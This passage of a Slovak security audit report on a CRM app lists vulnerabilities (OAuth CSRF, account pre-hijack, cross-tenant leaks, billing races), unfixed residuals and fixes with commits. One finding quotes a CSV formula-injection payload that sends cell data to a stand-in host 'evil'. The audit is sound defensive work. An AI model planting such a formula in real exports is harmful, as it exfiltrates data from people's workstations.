- `ios/PrplCRM/ContentView.swift:1327` — Navigačný allow-list používa substring `contains` a povoľuje ne-linkové navigácie na cudzie hosty vo WebView
- `server/jobs/commissionScheduler.js:48` — Race: updateMany prepíše 'revoked' províziu na 'eligible' (bez status guardu)
- `server/routes/admin.js:524` — PUT /users/:userId/plan prepíše celý subscription objekt a zmaže Stripe/Apple väzby, zľavu aj paidUntil
- `server/routes/auth.js:700` — PUT /profile mení e-mail bez overenia a ponecháva `emailVerified=true` → únos cudzích pozvánok do workspace
- `server/routes/auth.js:951` — DELETE /account zmaže používateľa, ale nezruší Stripe/Apple predplatné a nečistí prílohy úloh/kontaktov
- `server/routes/billing.js:230` — Stripe checkout nie je blokovaný pre používateľa s aktívnym Apple IAP predplatným (double billing)
- `server/routes/billing.js:557` — Stripe webhook vracia 200 aj pri prechodnej chybe spracovania — zaplatená aktivácia sa môže navždy stratiť
- `server/routes/contacts.js:1395` — PUT podúlohy spreaduje Mongoose subdokument – pri úprave podúlohy 1. úrovne sa stratia prílohy, priradenia, pripomienky a poradie
- `server/routes/googleCalendar.js:259` — OAuth callback bez CSRF ochrany – `state` je iba userId, útočník môže prepojiť svoj Google účet na cudzí CRM účet
- `server/routes/googleCalendar.js:937` — Webhook spracovanie padá na CastError pri UUID id kontaktových úloh/podúloh – zmeny z Google sa stratia
- `server/routes/googleCalendar.js:1006` — Reverse sync zapisuje `new Date()` do String poľa `dueDate` – do DB sa uloží lokalizovaný reťazec namiesto YYYY-MM-DD
- `server/routes/googleCalendar.js:1750` — /cleanup maže z Google udalosti podúloh a úloh z iných workspace-ov ako „osirotené“
- `server/routes/googleTasks.js:261` — OAuth callback Google Tasks bez CSRF ochrany – `state` je len userId
- `server/routes/googleTasks.js:1689` — /cleanup Google Tasks maže podúlohy a úlohy iných workspace-ov; navyše ignoruje X-Workspace-Id hlavičku
- `server/routes/googleTasks.js:2574` — Polling reverse sync zapisuje `new Date(googleDue)` do String poľa `dueDate`
- `server/routes/messages.js:504` — POST / neoveruje, že príjemca je členom aktuálneho workspace (cross-tenant správa + únik username)
- `server/routes/tasks.js:2477` — Rovnaký spread-bug v PUT /:taskId/subtasks/:subtaskId maže files, reminder, lastUrgencyLevel, copiedFrom, order
- `server/routes/workspaces.js:462` — Manažér workspace si môže ľubovoľne nastaviť paidSeats a obísť limit členov plánu
- `server/services/dueDateChecker.js:186` — Časové pripomienky (timeReminders) sa počítajú v UTC namiesto Europe/Bratislava – chodia o 1–2 h neskoro
- `server/services/dueDateChecker.js:521` — Jeden nevalidný Task dokument zastaví celý due-date scheduler (chýba try/catch na úrovni úlohy)
- `server/services/fcmService.js:156` — FCM: pri `messaging/invalid-argument` sa maže registrácia zariadenia, hoci chyba býva spôsobená payloadom
- `server/services/oauthService.js:74` — OAuth `state` nie je viazaný na prehliadač → login-CSRF a CSRF pri prepájaní účtov
- `server/services/oauthService.js:374` — Pre-account-hijack: auto-link OAuth identity na neoverený password účet so zhodným e-mailom

**Zostávajúce stredné a vyššie zvyšky:** žiadne.


## 3. Vedome neopravené zvyšky — zoradené podľa závažnosti

Po zrušení obmedzení som opravil všetko, čo sa dalo urobiť bezpečne a overiteľne. Pri nálezoch nižšie uvádzam, prečo zostali — väčšinou ide o produktové rozhodnutie, potrebu overenia na zariadení / v Render dashboarde, alebo zákaz premenovania. Značka „NEOVERENÉ nezávislým overovateľom" znamená, že nález pochádza z čítania kódu a adverzárne overenie neprebehlo.

### 3.1 Nízke a informačné (12) — stručne

| Závažnosť | Súbor:riadok | Nález | Prečo zostáva | Navrhovaná oprava | Overenie |
|---|---|---|---|---|---|
| NÍZKA | `android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:178` | targetSdk 36 = vynútené edge-to-edge, ale kontajner WebView nerieši systémové insety (statusBarColor je ignorované) | Natívny padding pre systémové lišty by na telefónoch s výrezom mohol vzniknúť dvakrát (WebView hlási výrez cez CSS `env()`); treba overiť na zariadení s Androidom 15+. | Postup: najprv overiť na zariadení/emulátore Android 15 a 16 (targetSdk 36), či hlavička a spodné prvky web appky nie sú prekryté stavovou/gestovou lištou. Ak áno, po MainActivity.kt:179 pridať `ViewCompat.setOnApplyWindowInsetsListener(rootLayout) { v, inset… | overovateľ: neisté |
| NÍZKA | `android-native/app/src/main/java/eu/prplcrm/app/WebAppInterface.kt:98` | saveFile prenáša celý súbor ako base64 reťazec cez JS most bez hornej hranice veľkosti | Rovnaké ako cli-crm-files-05 — veľké prílohy treba sťahovať priamym odkazom cez DownloadManager; strop na base64 by zablokoval dnes fungujúce 30–50 MB prílohy. | Navrhovaná oprava: natívne pridať do bridge metódu `downloadUrl(url: String, fileName: String?)`, ktorá overí isOurHost a zaradí sťahovanie do DownloadManager (rovnako ako DownloadListener, MainActivity.kt:371–394); v klientovi (fileDownload.js) pre Android p… | overené nezávislým overovateľom |
| NÍZKA | `server/routes/tasks.js:3027` | Check-then-act preteky pri plánových limitoch a storage kvóte | Atomický limit (podmienený $push s $size) a počítadlo úložiska `Workspace.storageBytes` menia dátový model a tok uploadu; bez spustiteľných DB testov je riziko regresie vyššie ako dopad (súbeh 2 paralelných requestov). Odporúčam ako samostatnú úlohu s testami proti MongoDB. | Navrhovaná oprava: pre počty použiť podmienený atomický zápis (`Contact.updateOne({ _id, workspaceId, $expr: { $lt: [{ $size: '$tasks' }, maxTasks] } }, { $push: { tasks: newTask } })` a 403 pri matchedCount 0); pre kvótu udržiavať počítadlo (napr. Workspace.… | overené nezávislým overovateľom |
| NÍZKA | `server/services/dueDateChecker.js:686` | checkContactDueDates: $elemMatch s $or nad tasks[] bez podporujúceho indexu → full scan Contact každých 5 min | Index na `tasks.reminder` by nepomohol — `$or` vnútri `$elemMatch` planner na indexované vetvy nerozdelí. Plánovač teraz číta kontakty kurzorom s úzkou projekciou (commit `fd53cb5`), takže záťaž klesla; plné riešenie = odstrániť legacy vetvu `reminder` (zmena správania pripomienok, rozhodnutie vlastníka). | Report-only (index): keďže `reminder` je legacy (Contact.js:40 komentár), zvážiť odstránenie vetvy reminder z $or alebo pridať index { 'tasks.reminder': 1 }; alternatívne spracúvať kontakty cez .cursor() a obmedziť na workspaces s aktívnymi členmi. | NEOVERENÉ nezávislým overovateľom |
| INFO | `client/src/pages/Tasks.jsx:1009` | Opätovné otvorenie dokončenej úlohy je obmedzené len na klientovi (user.role === 'admin') | Produktové rozhodnutie: stránka CRM dnes dovoľuje znovu otvoriť tú istú úlohu kontaktu bez obmedzenia. Serverová blokácia len na `/api/tasks` by pravidlo urobila nekonzistentným — vlastník rozhodne, či má platiť všade. | Rozhodnúť, či je „len admin môže znovu otvoriť" skutočné pravidlo. Ak áno, vynútiť na serveri: v PUT /:id (tasks.js:1347) a PUT subtask (tasks.js:2452) pri `completed === false && (task\|subtask).completed === true` overiť rolu (globálny admin alebo workspace… | overené nezávislým overovateľom |
| INFO | `client/public/_redirects:9` | Dve protichodné konfigurácie routingu: `_redirects` vs `render.yaml routes` | Ktoré pravidlá (`_redirects` alebo `routes` v render.yaml) Render skutočne používa, sa dá overiť len v Render dashboarde / curl na produkciu — z tohto prostredia je render.com blokovaný sieťovou politikou (neoverené). | Navrhovaná oprava: overiť v Render dashboarde (Redirects/Rewrites a Blueprint stav) a `curl -I https://prplcrm.eu/ochrana-udajov`, ktorá konfigurácia je aktívna; neaktívny zdroj (`client/public/_redirects` alebo `routes` v render.yaml) odstrániť a zjednotiť k… | overené nezávislým overovateľom |
| INFO | `server/routes/auth-apple.js:46` | Staré názvy/domény v defaultoch (perun-crm-api.onrender.com) – iba evidencia, nepremenovávať | Staré názvy — premenovanie podľa zadania nerobím (zoznam v kapitole 6). | Zdokumentovať v REPORT.md ako zoznam starých názvov; v budúcnosti presunúť do env bez defaultov. Deploy/konfigurácia → report-only. | NEOVERENÉ nezávislým overovateľom |
| INFO | `server/routes/googleCalendar.js:41` | Overenie podpisu webhooku je fail-open, ak nie je nastavený GOOGLE_WEBHOOK_SECRET – stav na Renderi neoverený | Fail-closed by bez nastavenej premennej úplne vypol synchronizáciu z Google (polling fallback pre Calendar neexistuje). Podvrhnutý webhook vie len spustiť synchronizáciu reálnych dát z Google. Akcia pre prevádzku: nastaviť `GOOGLE_WEBHOOK_SECRET` na Renderi (kapitola 7). | Overiť v Render dashboarde, že `GOOGLE_WEBHOOK_SECRET` je nastavený; zvážiť fail-closed (webhook ignorovať bez secretu), keďže polling fallback pre Calendar reálne neexistuje (viď srv-google-15). | NEOVERENÉ nezávislým overovateľom |
| INFO | `client/src/pages/AdminPanel.jsx:1` | Monolitický 8462-riadkový súbor: 14 tabov + chart.js + qrcode v jednom lazy chunku | Väčší refaktor (rozdelenie na lazy taby) — len admin rozhranie, bez dopadu na zákazníkov; samostatná úloha. | Navrhovaná oprava: postupne vyčleniť taby do client/src/pages/admin/*.jsx a v AdminPanel.jsx ich importovať cez React.lazy + Suspense (každý tab vlastný chunk), chart.js registráciu presunúť do zdieľaného modulu (napr. client/src/pages/admin/chartSetup.js). R… | overené nezávislým overovateľom |
| INFO | `client/src/utils/fileDownload.js:17` | Sťahovanie v shelloch kóduje celý súbor (až 50 MB) do base64 v pamäti WebView | Riešenie = podpísaný priamy odkaz + natívne sťahovanie (DownloadManager / WKDownload) pre veľké súbory, teda nový serverový endpoint a natívne zmeny s testom na zariadeniach. | Návrh: pre prílohy nad prah (napr. 15 MB) v shelloch nenačítavať blob cez axios, ale navigovať na podpísaný/jednorazový download odkaz a nechať shell stiahnuť natívne (rovnaký mechanizmus ako ZIP export: ContentView.swift ~1382 Content-Disposition, MainActivi… | overené nezávislým overovateľom |
| INFO | `client/src/pages/Attachments.jsx:107` | ZIP export naviguje celé okno na API host – v iOS PWA opustí aplikáciu, pri neúspechu zobrazí surový JSON | Skrytý iframe by narazil na `frame-ancestors`/X-Frame-Options odpovedí API a správanie iOS standalone PWA treba overiť na zariadení; natívne shelly navigáciu zachytávajú zámerne. | Návrh: na webe/PWA (`!isNativeApp()` z utils/platform.js:57) spustiť stiahnutie cez skrytý `<iframe src=...>` alebo `<a href target="_blank" rel="noopener">`, natívne shelly ponechať na `window.location.href`. Pred nasadením overiť v iOS standalone PWA, že sa… | overovateľ: neisté |
| INFO | `server/routes/googleCalendar.js:26` | Staré názvy (perun-crm-api.onrender.com, 'Perun CRM') v default hodnotách – pre zoznam premenovania | Staré názvy — premenovanie podľa zadania nerobím (zoznam v kapitole 6). | Zaradiť do REPORT.md sekcie starých názvov; po schválení premenovania zmeniť default hodnoty alebo ich úplne odstrániť a vyžadovať env premenné. | NEOVERENÉ nezávislým overovateľom |

**Ďalšie zistenia mimo zoznamu nálezov (stav po druhej vlne):**

- Natvrdo zapísané heslá v jednorazových skriptoch (hodnoty neuvádzam): `server/scripts/seed-admin.js:17`, `server/scripts/fix-index-and-create-admin.js:18`, `server/scripts/restore-user.js:25`, `server/scripts/restore-user.js:29` — **odstránené** (commit `d947b29`: heslo len z `SEED_ADMIN_PASSWORD`, restore-user.js zmazaný). V git histórii však ostávajú → účty, ktoré nimi niekedy vznikli, treba **zmeniť heslo** (kapitola 7).
- `ios/PrplCRM/GoogleService-Info.plist` a `android-native/upload_certificate.pem` sú v gite. Firebase klientska konfigurácia a upload certifikát nie sú tajomstvá v pravom zmysle (verejné ID / verejný certifikát), obsah som nečítal ani neuvádzam. Ponechané; ak chcete zjednotiť s `.gitignore` pre Android, stačí `git rm --cached`.
- `client/dist/` a `client/dev-dist/` — **odstránené z gitu** (commit `dde5f7c`), `dev-dist` doplnené do `.gitignore`.
- Osobný stav Xcode (`ios/PrplCRM.xcodeproj/**/xcuserdata/`, obsahoval lokálnu cestu vývojára) — **odstránený z gitu** (commit `3a51631`), `**/xcuserdata/` v `.gitignore`.
- Plánovače bez `stop()` — **doplnené** (commit `cb60997`), graceful shutdown zastaví všetky joby vrátane obnovy kalendárových kanálov.
- Opakované odoslanie pripomienky po zlyhaní uloženia — **opravené** (commit `fd53cb5`): stav sa zapisuje cielene pred odoslaním a pri zlyhaní zápisu sa notifikácia neodošle.

## 4. Čo bolo opravené

Každá oprava je samostatný commit na vetve `claude/audit-fixes` so slovenským popisom ČO a PREČO a so zoznamom ID nálezov. Žiadna oprava nepridáva npm balíček ani nemení verzie v `package.json`.

- **Prvá vlna** (do `a0c9fbe`): bez zmien DB schémy, indexov, autentifikácie, platieb, nasadenia a natívneho kódu.
- **Druhá vlna** (po schválení vlastníkom): mení aj autentifikáciu (`tokenVersion` v JWT — staré tokeny bez `tv` ostávajú platné; OAuth nonce; potvrdenie prepojenia účtov), platby (Stripe webhooky, promo kódy, Apple IAP), DB (nové indexy na Stripe/Google/Apple poliach vrátane unique `appleOriginalTransactionId`, nové polia `tokenVersion` a `googleCalendar.workspaceWatches`, odstránenie redundantných indexov jednorazovou migráciou), nasadenie (`render.yaml` hlavičky a CSP report-only) a natívne appky (iOS Swift, Android Kotlin). Z Gradle bola odstránená nepoužitá `androidx.biometric`.
- Web je spätne kompatibilný so staršími buildmi iOS/Android appiek (nové bridge správy `iapReady`/`iapFinish` staré appky ignorujú, `cnonce` v `prplcrm://auth` staré appky ignorujú). Nové natívne buildy naopak potrebujú nasadený nový web.

### 4.1 Opravené nálezy (súbor:riadok pred opravou a prečo)

**Server (API, Socket.IO, joby) — 309 nálezov**

| Závažnosť | Súbor:riadok | Čo bolo zlé | Prečo to vadilo | Commit |
|---|---|---|---|---|
| VYSOKÁ | `server/jobs/commissionScheduler.js:48` | Race: updateMany prepíše 'revoked' províziu na 'eligible' (bez status guardu) | Provízia z refundovanej platby sa môže stať vyplatiteľnou (admin bulk-pay filtruje `eligible`) → finančná strata; `totalEarnedEur` v dashboarde affiliateho nesedí s realitou. Okno je úzke (ms, raz denne), ale následok je peňažný. | `16c17741` |
| VYSOKÁ | `server/routes/admin.js:524` | PUT /users/:userId/plan prepíše celý subscription objekt a zmaže Stripe/Apple väzby, zľavu aj paidUntil | Ak admin zmení plán Stripe-platiacemu alebo Apple IAP používateľovi, systém stratí väzbu na subscription: webhooky (lookup podľa stripeCustomerId/appleOriginalTransactionId) používateľa nenájdu, používateľ ďalej platí, ale CRM ho… | `ef63d5c5` |
| VYSOKÁ | `server/routes/auth.js:700` | PUT /profile mení e-mail bez overenia a ponecháva `emailVerified=true` → únos cudzích pozvánok do workspace | Cross-tenant prístup do workspace, do ktorého bol pozvaný niekto iný; možnosť nastaviť neplatný/škodlivý e-mail a username. | `6a30a0f0` |
| VYSOKÁ | `server/routes/auth.js:951` | DELETE /account zmaže používateľa, ale nezruší Stripe/Apple predplatné a nečistí prílohy úloh/kontaktov | Platiaci používateľ je po zmazaní účtu ďalej účtovaný (strata peňazí/reklamácie, GDPR „právo na výmaz“ nesplnené voči Stripe); únik úložiska; nekonzistentný stav pri čiastočnom zlyhaní. | `6a30a0f0` |
| VYSOKÁ | `server/routes/billing.js:230` | Stripe checkout nie je blokovaný pre používateľa s aktívnym Apple IAP predplatným (double billing) | Zákazník platí dvakrát za ten istý plán (Apple + Stripe). Reputačné aj finančné riziko (refundy, chargebacky), stav `source` sa prepína medzi oboma systémami podľa toho, ktorý webhook príde posledný. | `dfc34ae5` |
| VYSOKÁ | `server/routes/billing.js:557` | Stripe webhook vracia 200 aj pri prechodnej chybe spracovania — zaplatená aktivácia sa môže navždy stratiť | Používateľ zaplatí, ale plán sa neaktivuje (alebo sa nepredĺži paidUntil pri renewal), bez automatickej nápravy — vyžaduje manuálny zásah admina po sťažnosti. Rovnako sa stratí downgrade pri `customer.subscription.deleted` (použí… | `fbc81a03` |
| VYSOKÁ | `server/routes/contacts.js:1395` | PUT podúlohy spreaduje Mongoose subdokument – pri úprave podúlohy 1. úrovne sa stratia prílohy, priradenia, pripomienky a poradie | Každé odškrtnutie / premenovanie / zmena termínu podúlohy 1. úrovne cez CRM alebo TaskList zmaže metadáta jej príloh (blob v R2 ostane ako sirota, príloha zmizne z UI a zo ZIP exportu), priradených kolegov (zmizne z „Moje úlohy“)… | `c2a34442` |
| VYSOKÁ | `server/routes/googleCalendar.js:259` | OAuth callback bez CSRF ochrany – `state` je iba userId, útočník môže prepojiť svoj Google účet na cudzí CRM účet | Úlohy obete zo VŠETKÝCH jej workspace-ov sa začnú automaticky synchronizovať do Google kalendára útočníka (exfiltrácia dát naprieč tenantmi); zároveň sa obíde plan-gate v /auth-url (callback plán nekontroluje). | `1a6b33f9` |
| VYSOKÁ | `server/routes/googleCalendar.js:937` | Webhook spracovanie padá na CastError pri UUID id kontaktových úloh/podúloh – zmeny z Google sa stratia | Akákoľvek úprava udalosti kontaktovej úlohy/podúlohy v Google Calendari zhodí celé spracovanie webhooku; zmeny (dátum, názov, dokončenie, zmazanie) všetkých udalostí v dávke sa ticho stratia – obojsmerná synchronizácia je nespoľa… | `e0178c19` |
| VYSOKÁ | `server/routes/googleCalendar.js:1006` | Reverse sync zapisuje `new Date()` do String poľa `dueDate` – do DB sa uloží lokalizovaný reťazec namiesto YYYY-MM-DD | Formát dueDate sa po reverse-synce zmení; klientský kód pracujúci so substringom/`split('T')` (napr. Messages.jsx:1304 `substring(0,10)`) dostane 'Sat Mar 28' – date input ostane prázdny, porovnania dátumov a triedenie podľa reťa… | `19a69340` |
| VYSOKÁ | `server/routes/googleCalendar.js:1750` | /cleanup maže z Google udalosti podúloh a úloh z iných workspace-ov ako „osirotené“ | Jedno kliknutie na „Vyčistiť“ zmaže z Google Calendara všetky synchronizované podúlohy a všetky udalosti ostatných workspace-ov používateľa (vrátane používateľom upravených pripomienok). Ďalší sync ich vytvorí nanovo – strata dát… | `b0924ad9` |
| VYSOKÁ | `server/routes/googleTasks.js:261` | OAuth callback Google Tasks bez CSRF ochrany – `state` je len userId | Útočník s ObjectId obete prepojí svoj Google účet na jej CRM účet – úlohy obete sa budú synchronizovať do útočníkovho Google Tasks (únik dát medzi používateľmi), plan-gate obídený. | `1a6b33f9` |
| VYSOKÁ | `server/routes/googleTasks.js:1689` | /cleanup Google Tasks maže podúlohy a úlohy iných workspace-ov; navyše ignoruje X-Workspace-Id hlavičku | „Vyčistiť“ zmaže z Google Tasks všetky synchronizované podúlohy a úlohy všetkých ostatných workspace-ov; pri viacerých zariadeniach sa navyše použije nesprávny workspace. Ďalší sync všetko vytvorí nanovo – duplicity a zbytočné če… | `03b23c69` |
| VYSOKÁ | `server/routes/googleTasks.js:2574` | Polling reverse sync zapisuje `new Date(googleDue)` do String poľa `dueDate` | Každá zmena termínu v Google Tasks (každých 5 min polling) poškodí formát dueDate v CRM – UI date inputy a reťazcové porovnania prestanú fungovať pre postihnuté úlohy. | `0132e7e6` |
| VYSOKÁ | `server/routes/messages.js:504` | POST / neoveruje, že príjemca je členom aktuálneho workspace (cross-tenant správa + únik username) | Porušenie multi-tenant izolácie: notifikácie/správy s ľubovoľným obsahom (phishing) do cudzieho tenanta, enumerácia username podľa ID, NoSQL operátor v `_id`. | `59118b12` |
| VYSOKÁ | `server/routes/tasks.js:2477` | Rovnaký spread-bug v PUT /:taskId/subtasks/:subtaskId maže files, reminder, lastUrgencyLevel, copiedFrom, order | Úprava subtasku (vrátane zmeny priradenia alebo pripomienky) zmaže jeho prílohy a ďalšie metadáta — trvalá strata dát. | `372da56a` |
| VYSOKÁ | `server/routes/workspaces.js:462` | Manažér workspace si môže ľubovoľne nastaviť paidSeats a obísť limit členov plánu | Ktorýkoľvek vlastník free/team workspace (je automaticky manažér) pošle PUT /api/workspaces/current/seats {paidSeats: 1000000} a získa neobmedzený počet členov bez upgradu plánu — strata príjmu, úplné obídenie plan-gatingu členov. | `ce1b1246` |
| VYSOKÁ | `server/services/dueDateChecker.js:186` | Časové pripomienky (timeReminders) sa počítajú v UTC namiesto Europe/Bratislava – chodia o 1–2 h neskoro | Všetky časové pripomienky (kategória 'direct', vždy push na iOS/Android/web) pre všetkých používateľov prichádzajú o 1–2 hodiny neskoro, v lete často až po termíne. Používateľ sa na funkciu spolieha a zmešká termín. | `852ee9e8` |
| VYSOKÁ | `server/services/dueDateChecker.js:521` | Jeden nevalidný Task dokument zastaví celý due-date scheduler (chýba try/catch na úrovni úlohy) | Trvalý výpadok urgency/deadline/time-reminder notifikácií pre všetky workspacy, ktorých úlohy sa v iterácii nachádzajú za chybným dokumentom, plus úplný výpadok kontaktných pripomienok. V logoch je iba „Scheduled check failed“ be… | `afafb8db` |
| VYSOKÁ | `server/services/fcmService.js:156` | FCM: pri `messaging/invalid-argument` sa maže registrácia zariadenia, hoci chyba býva spôsobená payloadom | Tichá, trvalá strata Android push notifikácií pre všetkých členov workspace, spustiteľná bežným používateľom (dlhý názov projektu/kontaktu). Obnova vyžaduje reinštaláciu appky alebo rotáciu FCM tokenu. | `ffc2d40f` |
| VYSOKÁ | `server/services/oauthService.js:74` | OAuth `state` nie je viazaný na prehliadač → login-CSRF a CSRF pri prepájaní účtov | Prevzatie budúcich OAuth prihlásení obete, zavádzanie dát obete do cudzieho účtu; porušenie základnej OAuth2 ochrany (RFC 6749 §10.12). | `3e9a9d15` |
| VYSOKÁ | `server/services/oauthService.js:374` | Pre-account-hijack: auto-link OAuth identity na neoverený password účet so zhodným e-mailom | Prevzatie účtu obete (všetky workspaces, kontakty, úlohy, správy) bez znalosti jej hesla — klasický „pre-hijacking“ útok (MSRC 2022). | `3e9a9d15` |
| STREDNÁ | `server/index.js:61` | CORS_ORIGIN sa berie ako jeden string — čiarkou oddelený zoznam (ako v .env.example) rozbije CORS pre všetkých | Pri konfigurácii podľa .env.example nefunguje v dev prostredí ani jeden API request z prehliadača. V produkcii stačí, aby operátor pridal druhý origin (napr. staging/preview doménu alebo `capacitor://localhost`) do existujúcej pr… | `6d9eba6d` |
| STREDNÁ | `server/index.js:143` | 5MB JSON limit pre /api/pages je neúčinný — globálny 1MB parser beží skôr a vráti 413 | Uloženie dlhšej stránky (rádovo >400k znakov) zlyhá s HTTP 413 a globálny error handler v produkcii vráti len `{ message: 'Nastala chyba servera' }` — používateľ stratí obsah editora bez zrozumiteľnej príčiny. Platí pre web, PWA … | `f579ce3c` |
| STREDNÁ | `server/index.js:223` | Mŕtvy express.static('/uploads') verejne (bez auth) servíruje xlsx s reálnymi biznis dátami commitnutý v repozitári | Únik interných prevádzkových dát (vrátane identifikátora karty) na verejnú URL bez autentifikácie. Mount zároveň otvára cestu, aby akýkoľvek súbor, ktorý sa omylom dostane do `server/uploads/` pri deployi, bol okamžite verejný. | `e9f5bbf4` |
| STREDNÁ | `server/middleware/workspace.js:39` | Cache členstva vo workspace sa neinvaliduje pri odobratí člena / zmene roly — odstránený člen má prístup ešte 60 s | Používateľ odstránený z workspace (napr. odchádzajúci zamestnanec) môže až 60 s po odstránení ďalej čítať, meniť a mazať kontakty/úlohy/správy daného tenanta cez REST; manažér degradovaný na člena si až 60 s drží admin práva (poz… | `19e175c` |
| STREDNÁ | `server/middleware/workspace.js:261` | enforceWorkspaceLimits načítava celý dokument vlastníka vrátane avatarData pri KAŽDOM POST requeste | Zbytočný prenos až megabajtov a CPU na hydratáciu pri každom zápise v workspace, ktorého vlastník má nahraný avatar — na Atlas M0 a Render Starter (512 MB RAM) to priamo predlžuje latenciu POST operácií a zvyšuje tlak na pamäť pr… | `29797554` |
| STREDNÁ | `server/models/User.js:454` | post('init') hook označí dešifrované Google tokeny ako modified → každé user.save() ich prepíše (lost-update race) | Zbytočné zápisy tokenov pri každom save() a reálna race: po Google token refresh môže nesúvisiaci save() vrátiť expirovaný access token (ďalší refresh) alebo starý refresh token (ak Google vydal nový → 'invalid_grant', používateľ… | `56802124` |
| STREDNÁ | `server/routes/admin.js:864` | GET /workspaces/:id načítava Base64 avatarData všetkých členov | Detail workspace-u s 10 členmi môže znamenať desiatky MB čítania z Mongo, serializácie JSON a prenosu do admin prehliadača; pomalé UI a tlak na pamäť servera (Render inštancia). | `4b76a838` |
| STREDNÁ | `server/routes/admin.js:941` | GET /users/:id vracia OAuth tokeny, syncToken, calendarFeedToken, reset hash, IBAN a avatarData blob | Tajomstvá tretích strán opúšťajú server a zostávajú v pamäti/DevTools admin prehliadača a v proxy logoch; kompromitovaná admin session = prístup ku Google účtom používateľov a k ich kalendárovým feedom. Zároveň zbytočne veľká odp… | `20f5a206` |
| STREDNÁ | `server/routes/admin.js:1298` | CSV export používateľov a workspace-ov bez ochrany proti CSV/formula injection | Bežný používateľ s username napr. `=HYPERLINK("http://evil/"&A1,"x")` alebo DDE payload môže pri otvorení exportu adminom spustiť vzorec/exfiltrovať dáta z admin pracovnej stanice. | `c8ca61c6` |
| STREDNÁ | `server/routes/admin.js:1467` | DELETE /workspaces/:id neúplná kaskáda – ostanú Pages, Notifications, Invitations a currentWorkspaceId používateľov | Používatelia s `currentWorkspaceId` ukazujúcim na zmazaný workspace dostanú pri ďalšom prihlásení chybu/prázdny stav (workspace middleware nenájde workspace); osirelé pozvánky možno stále prijať; orphan dokumenty v DB. | `31b9e35a` |
| STREDNÁ | `server/routes/admin.js:2293` | POST /promo-codes vytvorí Stripe coupon + promotion code ešte pred validáciou referrera | Osirelé aktívne kupóny/promo kódy v Stripe (zľava platí pri checkoute, hoci v CRM kód neexistuje) a následne vytvorený CRM kód bez Stripe väzby, ktorý pri Stripe checkoute nefunguje – tichá nekonzistencia medzi CRM a Stripe. | `425553ca` |
| STREDNÁ | `server/routes/admin.js:3042` | GET /email-logs populuje avatarData blob pre každý riadok len kvôli booleanu hasAvatarData | Jedno otvorenie Email tabu môže načítať stovky MB z MongoDB a držať ich v pamäti Node procesu; zbytočne pomalé a riziko OOM pri väčšom limite. | `8fdb0973` |
| STREDNÁ | `server/routes/admin.js:3254` | Email broadcast nemá ochranu proti súbežnému spusteniu – duplicitné maily celej user base | Všetci cieľoví používatelia dostanú marketingový mail 2×, hrozí spam reputácia SMTP domény; nedá sa zastaviť ani sledovať. | `af4f8fd2` |
| STREDNÁ | `server/routes/admin.js:3362` | Audit záznamy s category 'security' a 'admin' sa nikdy neuložia – AuditLog enum ich nepozná | Bezpečnostný monitoring (neplatné JWT, rate-limit, IDOR pokusy) a audit admin akcií sú slepé – záznamy sa stratia bez chyby pre volajúceho; admin UI ukazuje falošnú nulu. | `ef63d5c5` |
| STREDNÁ | `server/routes/auth-apple.js:378` | Apple native endpoint akceptuje e-mail z tela požiadavky (klientom kontrolovaný) ako identitu účtu | Squatting e-mailových adries, príprava na prevzatie účtu, vytváranie účtov s cudzím e-mailom (phishing/spam z pohľadu obete — welcome e-maily). | `3e9a9d15` |
| STREDNÁ | `server/routes/auth.js:76` | /register a /login bez typovej a formátovej validácie vstupov (e-mail, username) — 500 namiesto 400, operátorové objekty v dopytoch | Falošné 500-ky v monitoringu, možnosť vytvárať účty s neplatnými/obrovskými hodnotami (zobrazujú sa ostatným členom cez /users), HTML injekcia do e-mailov pre admina. | `6a30a0f0` |
| STREDNÁ | `server/routes/auth.js:885` | Zmena/reset hesla nezneplatní existujúce JWT relácie (7 dní) | Útočník s odcudzeným tokenom si udrží prístup napriek zmene hesla; nesplnené očakávanie „odhlásiť všetky zariadenia“. | `57c98ad6` |
| STREDNÁ | `server/routes/auth.js:1197` | POST /set-plan prepíše celý `subscription` subdokument a vymaže Stripe/Apple väzby | Strata platobných dát zákazníka, nefunkčné spracovanie ďalších platieb/obnovení, možný dvojitý billing. | `6a30a0f0` |
| STREDNÁ | `server/routes/auth.js:1213` | DELETE /users/:userId — globálny admin/manager tvrdo zmaže ľubovoľného používateľa bez validácie ID, kaskády a invalidácie cache | Nekonzistentné dáta (workspaces bez vlastníka), možnosť zmazať vlastný admin účet pri výpadku Redisu, krátke okno platnosti tokenu zmazaného používateľa. | `6a30a0f0` |
| STREDNÁ | `server/routes/billing.js:274` | Promo kód: check-then-act race a použitie sa započíta pri vytvorení session, nie pri platbe | Prekročenie `maxUses` (finančná strata na zľavách), falošne 'vyčerpané' kódy pre používateľov, ktorí platbu opustili (support záťaž), nekonzistentné štatistiky `usedCount` vs. reálne redemptions. | `20f64f0c` |
| STREDNÁ | `server/routes/billing.js:299` | Použitie promo kódu sa započíta pri vytvorení checkout session, nie po zaplatení | Útočník alebo chybný klient znefunkční promo kód pre ostatných; nesprávne štatistiky affiliate provízií. | `20f64f0c` |
| STREDNÁ | `server/routes/billing.js:364` | GET /verify-session porovnáva string s ObjectId — vracia 403 vlastníkovi session pri cache miss / bez Redis | Verifikácia po návrate zo Stripe Checkout prakticky nefunguje; stav plánu v UI sa po platbe neobnoví okamžite (až po 2 s cez /auth/me). Falošné 403 zahlcujú logy a maskujú reálne pokusy o zneužitie. | `3081bff4` |
| STREDNÁ | `server/routes/billing.js:616` | handleSubscriptionUpdated fallback podľa stripeCustomerId aplikuje cudzie/staré predplatné na používateľa | Platiaci používateľ je downgradnutý na free a jeho záznam ukazuje na neexistujúce predplatné; ďalšie eventy pre správne predplatné sa už nenapárujú podľa ID (len cez ten istý fallback), stav sa môže 'rozkmitať'. | `699e8829` |
| STREDNÁ | `server/routes/billing.js:646` | Webhook handlery čítajú `subscription.current_period_end` a `invoice.subscription` priamo z payloadu — závisí od API verzie webhook endpointu v Strip… | Po zmene/aktualizácii verzie webhook endpointu (napr. pri vytvorení nového endpointu po migrácii domény) prestanú renewal a update eventy ticho fungovať — plány expirujú napriek platbe. | `699e8829` |
| STREDNÁ | `server/routes/billingApple.js:150` | POST /apple/verify nekontroluje `revocationDate` — replay refundovanej/revokovanej transakcie znova aktivuje plán | Prístup k platenému plánu bez platby po refunde (strata príjmu); obchádza downgrade z REFUND/REVOKE notifikácie. | `6e72629b` |
